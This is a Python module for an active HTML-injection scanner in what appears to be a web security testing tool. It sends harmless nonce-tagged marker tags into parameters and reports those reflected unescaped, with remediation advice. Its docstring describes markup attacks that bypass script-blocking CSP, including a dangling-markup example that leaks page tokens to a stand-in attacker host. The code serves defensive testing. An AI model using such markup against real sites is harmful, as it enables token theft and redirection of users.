"""HTML-injection scanner (unescaped markup reflection, no script required).

Distinct from the XSS scanner: this flags parameters whose input is reflected
into an HTML response as **live markup** even when script execution is filtered.
Non-script tags are dangerous on their own - ``<base href>`` rewrites every
relative URL, ``<meta http-equiv=refresh>`` silently redirects, and dangling
markup (``<img src=//attacker/?leak=``) exfiltrates page tokens to the next
quote - all effective under a script-blocking CSP.

Detection is deterministic: inject a benign nonce-tagged marker tag; if the tag
survives **unescaped** in an HTML response (``<u>NONCE`` present, not the
harmless ``&lt;u&gt;NONCE``), the parameter injects markup. Content-type must be
HTML so a JSON string echo is not mistaken for a live sink.
"""

from __future__ import annotations

import secrets
from collections.abc import AsyncIterator

from orthrus.core.context import ScanContext
from orthrus.core.schemas import Aggressiveness, Confidence, Evidence, Finding, Severity
from orthrus.scanners._injection import InjectionPoint, injection_points, send, used_url
from orthrus.scanners.base_scanner import BaseScanner
from orthrus.scanners.registry import register

SCANNER_NAME = "html-injection"
MAX_POINTS = 60

# Benign nonce-tagged marker payloads. {c} is a unique per-point canary so a
# match cannot be a pre-existing page string.
_PAYLOAD_TEMPLATES = (
    "<u>{c}</u>",
    "<img src=x alt={c}>",
    "<a href=//{c}.example>{c}</a>",
)


def html_injection_succeeded(response: str, canary: str) -> str | None:
    """Return the reflected marker tag if it survived unescaped, else None."""
    for probe in (f"<u>{canary}", f"<img src=x alt={canary}", f"<a href=//{canary}"):
        if probe in response:
            return probe
    return None


@register
class HtmlInjectionScanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "html-injection"
    min_aggressiveness = Aggressiveness.NORMAL

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        count = 0
        for point in injection_points(ctx):
            if count >= MAX_POINTS:
                break
            count += 1
            canary = f"orthrushi{secrets.token_hex(4)}"
            for template in _PAYLOAD_TEMPLATES:
                payload = template.format(c=canary)
                resp = await send(ctx, point, payload)
                if resp is None:
                    continue
                if "html" not in resp.headers.get("content-type", "").lower():
                    continue
                marker = html_injection_succeeded(resp.text, canary)
                if marker is not None:
                    yield self._finding(point, payload, marker)
                    break

    def _finding(self, point: InjectionPoint, payload: str, marker: str) -> Finding:
        return Finding(
            vuln_type="html-injection",
            title=f"HTML injection (unescaped markup) via '{point.param}'",
            severity=Severity.MEDIUM,
            confidence=Confidence.FIRM,
            url=used_url(point, payload),
            parameter=point.param,
            param_location=point.location,
            description=(
                f"Input to '{point.param}' is reflected into an HTML response as live markup "
                f"(the injected tag '{marker}…' appears unescaped). Even without script execution "
                "this enables markup attacks that work under a script-blocking CSP: <base href> "
                "URL rewriting, <meta refresh> redirection, dangling-markup token exfiltration, and "
                "form/credential capture. It is also frequently a filtered-XSS precursor."
            ),
            remediation=(
                "Contextually HTML-encode all user input on output (< > \" ' &). Prefer a template "
                "engine with auto-escaping; never concatenate input into markup. Add a strict CSP as "
                "defence in depth (it does not stop <base>/<meta>/dangling-markup on its own)."
            ),
            cwe="CWE-79",
            scanner=SCANNER_NAME,
            evidence=Evidence(
                request_raw=f"{point.param}={payload}",
                matched_at=marker,
                notes="injected marker tag reflected unescaped in an HTML response",
            ),
        )


__all__ = ["HtmlInjectionScanner", "html_injection_succeeded"]
